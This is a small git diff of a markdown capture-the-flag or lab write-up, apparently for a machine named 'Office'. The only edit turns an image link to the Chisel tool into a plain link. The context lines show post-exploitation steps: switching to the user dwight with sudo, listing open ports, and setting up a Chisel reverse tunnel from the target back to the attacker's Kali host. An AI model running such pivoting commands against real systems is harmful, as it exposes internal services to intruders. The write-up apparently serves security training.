@@ -76,7 +76,7 @@ We can run the following script to become dwight `sudo -u dwight /bin/bash`:
 From here, there are a few things that I check manually such as locally open ports with `netstat -tulpn`:
 ![Office Open Ports](office-netstat.png)
 
-It looks like the port 10000 is open so we can forward this port back to our local Kali machine with ![Chisel](https://github.com/jpillora/chisel)
+It looks like the port 10000 is open so we can forward this port back to our local Kali machine with [Chisel](https://github.com/jpillora/chisel)
 1. On Kali, I started a chisel server: `./chisel_1.7.6_linux_amd64 server -p 1111 --reverse` ![Chisel Server](office-chisel-server.png)
 2. On the target, I started a chisel client: `./chisel_1.7.6_linux_amd64 client 10.10.0.18:1111 R:9050:127.0.0.1:10000` ![Chisel Client](office-chisel-client.png)
 
